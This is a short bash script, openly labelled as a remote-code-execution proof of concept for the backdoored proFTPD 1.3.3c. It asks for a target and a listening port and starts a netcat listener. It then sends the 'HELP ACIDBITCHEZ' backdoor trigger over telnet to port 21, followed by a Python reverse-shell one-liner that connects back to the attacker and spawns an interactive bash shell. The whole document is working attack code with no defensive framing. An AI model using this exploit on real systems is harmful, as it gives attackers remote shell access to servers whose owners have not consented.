#!/bin/bash
#
# exploit proFTPD 1.3.3c -- RCE POC
#
##
# Use blablabla
##
read -p "IP to Attack: " _TARGET
read -p "Your IP: " _LOCAL
read -p "A Port to listen: " _LOCALPORT
###
# Set Your terminal for nc listener
konsole -e nc -nlvp $_LOCALPORT &
#xterm -e nc -nlvp $_LOCALPORT &
#konsole -e nc -nlvp $_LOCALPORT &
#xfce4-terminal -e nc -nlvp $_LOCALPORT &

{
sleep 1;
echo "HELP ACIDBITCHEZ"
sleep 1;
echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$_LOCAL\",$_LOCALPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);';"
sleep 1;
echo exit
} | telnet $_TARGET 21
#If you want to change the remote port. Up here
